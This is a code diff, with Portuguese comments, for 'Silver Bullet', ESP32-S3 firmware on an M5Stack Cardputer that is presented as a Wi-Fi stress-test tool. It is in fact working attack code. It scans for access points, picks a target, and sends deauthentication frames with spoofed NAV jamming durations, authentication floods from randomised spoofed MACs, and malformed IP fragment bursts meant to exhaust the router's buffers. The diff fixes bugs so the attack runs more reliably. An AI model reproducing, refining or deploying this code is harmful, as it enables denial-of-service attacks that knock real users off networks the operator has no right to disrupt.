@@ -2,13 +2,11 @@
  * @file silver_bullet.cpp
  * @brief Silver Bullet - Ferramenta Avançada de Teste de Estresse Wi-Fi (L2/L3)
  * @hardware M5Stack Cardputer (ESP32-S3)
- * * @details
- * Esta versão implementa técnicas agressivas de esgotamento de recursos:
- * 1. Zero-Copy DMA: Transmissão direta da RAM para o rádio.
- * 2. NAV Spoofing (Jamming): Reserva o espectro de rádio por 32.767µs por quadro.
- * 3. Auth Flood: Esgota a tabela de estado de clientes do AP.
- * 4. Memory Exhaustion L3: Fragmentação infinita forçando estouro de buffer no kernel alvo.
- * 5. Rádio Always-On: Desativação do Modem Sleep para TX contínuo.
+ * * * Correções Arquiteturais Aplicadas:
+ * 1. Task Starvation Resolvido: Prioridade da task_ataque reduzida para 20 (Abaixo da wifi_task do ESP-IDF).
+ * 2. Conflito de Scanner: Modo promíscuo removido, permitindo injeção Raw nativa em modo STA.
+ * 3. OOM CPU Leak: Checagem de ESP_ERR_NO_MEM estendida para L2, com yield real (vTaskDelay) para o driver.
+ * 4. PRNG Freeze: Proteção matemática contra semente zero no motor Xorshift32.
  */
 
 #include <M5Unified.h>
@@ -36,7 +34,6 @@ struct __attribute__((packed, aligned(4))) DeauthPacket {
     uint16_t reason_code;
 };
 
-// Estrutura para o Auth Flood (Management Frame)
 struct __attribute__((packed, aligned(4))) AuthPacket {
     uint16_t frame_control;
     uint16_t duration;
@@ -99,9 +96,6 @@ uint32_t prng_state = 1;
 // 3. MOTORES DE ALTA PERFORMANCE (SRAM / IRAM_ATTR)
 // -------------------------------------------------------------------
 
-/**
- * @brief Xorshift32 - Gerador Pseudoaleatório Bitwise (Zero Latency)
- */
 IRAM_ATTR inline uint32_t fast_rand() {
     uint32_t x = prng_state;
     x ^= x << 13;
@@ -110,9 +104,6 @@ IRAM_ATTR inline uint32_t fast_rand() {
     return prng_state = x;
 }
 
-/**
- * @brief Checksum IPv4 RFC 1071 (Otimizado)
- */
 IRAM_ATTR inline uint16_t calcular_checksum_ip(void *vdata, size_t length) {
     uint16_t *data = (uint16_t *)vdata;
     uint32_t acc = 0;
@@ -234,18 +225,18 @@ void task_display(void *pvParameters) {
 }
 
 // -------------------------------------------------------------------
-// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - GOD MODE)
+// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - CORRIGIDO)
 // -------------------------------------------------------------------
 void task_ataque(void *pvParameters) {
     
-    // Alocação Zero-Copy no DMA
     SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
     DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
     AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
     
+    // CORREÇÃO 4: Risco de Congelamento do Motor de Entropia (Xorshift32)
     prng_state = esp_random(); 
+    if (prng_state == 0) prng_state = 1; 
 
-    // Payload estático L3 (O Roteador não lê payload de fragmentos, apenas o cabeçalho)
     for(size_t i = 0; i < sizeof(pkt->payload); i++) pkt->payload[i] = (uint8_t)(fast_rand() & 0xFF);
 
     while (true) {
@@ -255,10 +246,10 @@ void task_ataque(void *pvParameters) {
             esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
             uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
 
-            // --- L2: DEAUTH (NAV SPOOFING / JAMMING) ---
+            // --- L2: DEAUTH (NAV SPOOFING) ---
             memset(deauth, 0, sizeof(DeauthPacket));
             deauth->frame_control = 0x00C0; 
-            deauth->duration = 32767; // Silencia o canal virtualmente (Manda os outros rádios calarem a boca)
+            deauth->duration = 32767; 
             memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
             memcpy(deauth->mac_src, mac_alvo, 6);
             memcpy(deauth->mac_bssid, mac_alvo, 6);
@@ -267,7 +258,7 @@ void task_ataque(void *pvParameters) {
             // --- L2: AUTH FLOOD ---
             memset(auth, 0, sizeof(AuthPacket));
             auth->frame_control = 0x00B0; 
-            auth->duration = 32767; // Jamming passivo contínuo
+            auth->duration = 32767; 
             memcpy(auth->mac_dest, mac_alvo, 6);
             memcpy(auth->mac_bssid, mac_alvo, 6);
             auth->auth_algorithm = 0x0000; 
@@ -284,9 +275,8 @@ void task_ataque(void *pvParameters) {
             pkt->ip.ttl = 64;
             pkt->ip.protocol = 17;
 
-            // 1. Rajada L2 Mista (Jamming + Tabela de Clientes OOM)
+            // 1. Rajada L2 Mista
             for(int j = 0; j < 15; j++) {
-                // MAC Spoofing (Simula clientes da mesma marca aleatorizando os ultimos 3 bytes)
                 memcpy(auth->mac_src, mac_alvo, 3); 
                 auth->mac_src[3] = fast_rand() & 0xFF;
                 auth->mac_src[4] = fast_rand() & 0xFF;
@@ -295,11 +285,17 @@ void task_ataque(void *pvParameters) {
                 auth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                 deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
 
-                esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false);
-                esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false);
+                esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false);
+                esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false);
+                
+                // CORREÇÃO 3: Prevenção de CPU Cycle Leak no L2
+                if (err1 == ESP_ERR_NO_MEM || err2 == ESP_ERR_NO_MEM) {
+                    vTaskDelay(pdMS_TO_TICKS(1)); // Tick real para limpeza do driver
+                    break;
+                }
             }
 
-            // 2. Rajada L3 (Destruição do Buffer Global do Roteador)
+            // 2. Rajada L3
             for (int i = 0; i < 150; i++) { 
                 memcpy(pkt->mac.mac_src, mac_alvo, 4);
                 pkt->mac.mac_src[4] = fast_rand() & 0xFF;
@@ -307,7 +303,6 @@ void task_ataque(void *pvParameters) {
 
                 pkt->ip.id = (uint16_t)fast_rand(); 
                 
-                // Mágica: Bit 13 ativado (More Fragments) + tamanho impossível
                 uint16_t offset_falso = fast_rand() & 0x1FFF;
                 pkt->ip.frag_off = htons(0x2000 | offset_falso); 
                 pkt->ip.total_length = htons(40000 + (fast_rand() % 5000)); 
@@ -315,15 +310,14 @@ void task_ataque(void *pvParameters) {
                 pkt->ip.checksum = 0; 
                 pkt->ip.checksum = calcular_checksum_ip(&pkt->ip, sizeof(IpHeader));
                 
-                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(SilverBulletPacket), false);
+                esp_err_t err3 = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(SilverBulletPacket), false);
                 
-                if (err == ESP_ERR_NO_MEM) {
-                    taskYIELD(); 
+                // CORREÇÃO 3: Prevenção de CPU Cycle Leak no L3
+                if (err3 == ESP_ERR_NO_MEM) {
+                    vTaskDelay(pdMS_TO_TICKS(1)); 
                     break;
                 }
             }
-
-            vTaskDelay(pdMS_TO_TICKS(1)); 
 
         } else {
             vTaskDelay(pdMS_TO_TICKS(50));
@@ -349,11 +343,10 @@ extern "C" void app_main(void) {
     esp_wifi_set_mode(WIFI_MODE_STA);
     
     esp_wifi_start();
-    
-    // FORÇA BRUTA: Impede o ESP32 de entrar em Modem Sleep (mantém TX no máximo)
     esp_wifi_set_ps(WIFI_PS_NONE); 
 
-    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0); 
+    // CORREÇÃO 1: Task Starvation (Prioridade reduzida para 20. wifi_task roda em 23)
+    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 20, NULL, 0); 
     xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
 
@@ -387,7 +380,10 @@ extern "C" void app_main(void) {
                 if (total_alvos > 0) {
                     canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary);
                     M5.Display.clear();
-                    esp_wifi_set_promiscuous(true);
+                    
+                    // CORREÇÃO 2: Modo promíscuo removido para não travar o Scan no Core 1.
+                    // A injeção Raw L2/L3 funciona perfeitamente apenas com a interface STA ligada.
+                    
                     estado_atual.store(ESTADO_ATIRAR);
                 } else {
                     escanear_redes();
@@ -399,7 +395,6 @@ extern "C" void app_main(void) {
         else if (estado_atual.load() == ESTADO_ATIRAR) {
             if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                 estado_atual.store(ESTADO_SELECIONAR); 
-                esp_wifi_set_promiscuous(false);
                 escanear_redes(); 
                 desenhar_menu();
                 vTaskDelay(pdMS_TO_TICKS(300));
